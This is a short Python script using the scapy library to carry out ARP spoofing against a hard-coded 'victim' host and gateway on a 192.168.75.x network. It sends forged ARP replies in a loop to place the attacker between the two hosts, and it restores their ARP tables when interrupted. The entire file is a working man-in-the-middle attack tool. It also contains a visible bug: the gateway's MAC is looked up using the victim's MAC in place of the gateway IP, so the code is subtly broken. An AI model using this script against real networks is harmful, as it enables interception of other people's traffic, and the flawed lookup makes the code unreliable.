from scapy.all import *
from scapy.layers.l2 import Ether, ARP
from time import sleep


def getMAC(ip):
    ans, unans = srp(Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=ip), timeout=5, retry=3)
    for s, r in ans:
        return r.sprintf('%Ether.src%')

def poisonARP(srcip, targetip, targetmac):
    arp = ARP(op=2, psrc=srcip, pdst=targetip, hwdst=targetmac)
    send(arp)

def restoreARP(victimip, gatewayip, victimmac, gatewaymac):
    arp1 = ARP(op=2, pdst=victimip, psrc=gatewayip, hwdst='ff:ff:ff:ff:ff:ff', hwsrc=gatewaymac)
    arp2 = ARP(op=2, pdst=gatewayip, psrc=victimip, hwdst='ff:ff:ff:ff:ff:ff', hwsrc=victimmac)
    send(arp1, count=3)
    send(arp2, count=3)

def main():
    gatewayip = '192.168.75.1'
    victimip = '192.168.75.227'

    victimmac = getMAC(victimip)
    gatewaymac = getMAC(victimmac)

    if victimmac == None or gatewaymac == None:
        print('Could not find MAC Address')
        return

    print('+++ ARP Spoofing START -> VICTIM IP[{}]'.format(victimip))
    print('[{}]: POISON ARP Table [{}] -> [{}]'.format(victimip, gatewaymac, victimmac))
    try:
        while True:
            poisonARP(gatewayip, victimip, victimmac)
            poisonARP(victimip, gatewayip, gatewaymac)
            sleep(3)
    except KeyboardInterrupt:
        restoreARP(victimip, gatewayip, victimmac, gatewaymac)
        print('--- ARP Spoofing END -> RESTORED ARP Table')

if __name__ == "__main__":
    main()